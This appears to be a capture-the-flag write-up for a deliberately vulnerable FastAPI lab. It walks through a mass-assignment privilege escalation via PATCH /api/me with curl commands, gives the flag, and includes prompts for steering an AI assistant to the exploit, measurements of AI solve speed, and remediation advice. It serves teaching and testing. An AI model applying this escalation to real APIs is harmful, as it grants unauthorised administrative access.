# api-ai (AI-modus)

`api1`–`api3` are about enumerating a REST API and reading responses. The first
cut of this challenge was a one-shot mass assignment (`POST /api/register` with
`is_admin:true`). That was too easy, so it's **patched** — and the real path is
now a **two-stage** escalation.

## Intended solve

1. **Enumerate.** It's FastAPI, so `/docs` and `/openapi.json` describe
   everything: `POST /api/register`, `POST /api/login`, `GET /api/me`,
   `PATCH /api/me`, and `GET /api/admin/flag` ("Admin only"). The flag endpoint
   403s with a generic `insufficient permissions` — it does **not** name the
   scope it wants. But `GET /api/me` shows your account carries
   `permissions: ["noteworthy:read", "noteworthy:write"]`, so the admin scope is
   the obvious third in that namespace: infer `noteworthy:admin` (nothing hands
   it to you).

2. **The obvious ways are closed.** `RegisterIn` no longer has `is_admin`
   (registering can't make you admin), and `PATCH /api/me` explicitly rejects
   `role` and `is_admin`:

   ```bash
   curl -s -X PATCH http://<host>:<port>/api/me -H "Authorization: Bearer $TOK" \
     -H 'Content-Type: application/json' -d '{"role":"admin"}'
   # -> 400 {"detail":"'role' is read-only"}
   ```

3. **The window they forgot: `permissions`.** `PATCH /api/me` mass-assigns any
   field that isn't in its protect-list — and `permissions` isn't on it. Grant
   yourself the admin scope you inferred in step 1:

   ```bash
   TOK=$(curl -s -X POST http://<host>:<port>/api/register \
     -H 'Content-Type: application/json' \
     -d '{"username":"pwn","password":"pw"}' | jq -r .token)

   curl -s -X PATCH http://<host>:<port>/api/me -H "Authorization: Bearer $TOK" \
     -H 'Content-Type: application/json' \
     -d '{"permissions":["noteworthy:admin"]}'

   curl -s http://<host>:<port>/api/admin/flag -H "Authorization: Bearer $TOK"
   # -> {"flag":"flag{...}"}
   ```

The AI-tier step is realising the patched obvious fields are a red herring and
that a *different*, unprotected field (`permissions`) is still mass-assignable —
exactly what an assistant flags when it reads the `PATCH /api/me` handler.

## Run the exploit

```bash
python3 solve.py http://<host>:<port>     # e.g. http://localhost:5008
```

## Flag

```
flag{mass_assignment_made_me_admin}
```

## Note for organisers

The fix is to bind updates through an explicit allow-list of client-settable
fields (a separate input model), never to merge the request body into the user
record. The flag comes from `flag.txt` at runtime, not from the source that the
source hint discloses.

## Debrief: what you learn and how to protect against it

**What you learn:** mass assignment. An API that copies fields from the request
body straight into a stored object lets the client set fields it was never meant
to control. The developers blocked the obvious ones (`role`, `is_admin`) with a
block-list, and a block-list always forgets something: here `permissions`. You
also practise enumerating an API from its OpenAPI docs and reasoning about what a
generic 403 hides.

**The solve in short:**

1. Read `/openapi.json`: register, login, `GET`/`PATCH /api/me` and an admin-only
   flag endpoint.
2. Register and look at `GET /api/me`: your account has
   `permissions: ["noteworthy:read", "noteworthy:write"]`.
3. Try the obvious (`role`, `is_admin` through `PATCH /api/me`): rejected.
4. `PATCH /api/me` with `{"permissions": ["noteworthy:admin"]}`: accepted.
5. `GET /api/admin/flag` now returns the flag.

**How to protect against it:**

- Use an allow-list, not a block-list. Define a separate input model that holds
  only the fields a client may change (e.g. display name), and reject everything
  else (in Pydantic: `extra="forbid"`).
- Never merge a request body into a database record.
- Change roles and permissions only through a separate, admin-only endpoint, and
  log it when it happens.
- Write a test that tries to set every privileged field as a normal user. In the
  OWASP API Security Top 10 this is API3, Broken Object Property Level
  Authorization.

## How hard it is for an AI

The first cut of the harder version named the target scope everywhere — a root
`/` "tip" spelling out the plan, the OpenAPI description, and the 403 body all
said `noteworthy:admin` — so a fresh assistant solved it in **5 tool calls**. The
disclosures were removed (generic `insufficient permissions`, no tip) and new
accounts now carry `noteworthy:read` / `noteworthy:write` so the admin scope has
to be *inferred* from the pattern rather than read off a response. A fresh
assistant still solved it in **5 tool calls** (~36 s): the `read`/`write` → `admin`
inference is immediate, and mass assignment is an inherently fast bug to spot
once you see your own `permissions` field and the `additionalProperties: true` on
`PATCH /api/me`. It keeps a real dead end (the `role` blocklist — the patched
front door), but the floor for this vuln class against a strong model is low.
The change's value is that it is now genuinely black-box: the free giveaways are
gone, so the source hint is worth buying.

## Solving it with an AI (prompts)

Black-box by default: point the assistant at the live URL — FastAPI exposes
`/docs` and `/openapi.json`, so it can enumerate the API without source. If you
buy the source hint, hand it `app.py` too.

- **Cold open:** "A FastAPI app runs at <url>; read `/openapi.json` to enumerate
  it. Registration used to let you set `is_admin` but that's patched now. Get the
  flag from the admin-only endpoint. Give me curl commands." (If you have the
  source hint, add: "`app.py` is attached.")
- **If it stalls:** "`GET /api/admin/flag` 403s generically, but `GET /api/me`
  shows your scopes are `noteworthy:read`/`noteworthy:write`, so the admin scope
  is `noteworthy:admin`. `PATCH /api/me` blocks `role`/`is_admin` but mass-assigns any other
  field — including `permissions`. Register, `PATCH /api/me` with
  `{\"permissions\":[\"noteworthy:admin\"]}`, then GET the flag. Give me the
  exact calls."

## Difficulty-tuning re-test (2026-11)

A fresh zero-context agent solved it clean in **5 tool calls** (black-box mass-assignment of the `permissions` scope), at the baseline floor. The solve path is unchanged by the 2h45-event tuning pass; what changed is
hint pricing: 35/60/90 -> 35/120/150 (near-answer/source hints repriced toward their marginal value,
no cost lowered). Full cross-challenge detail in [docs/ai-difficulty-tuning.md](../../../../docs/ai-difficulty-tuning.md).
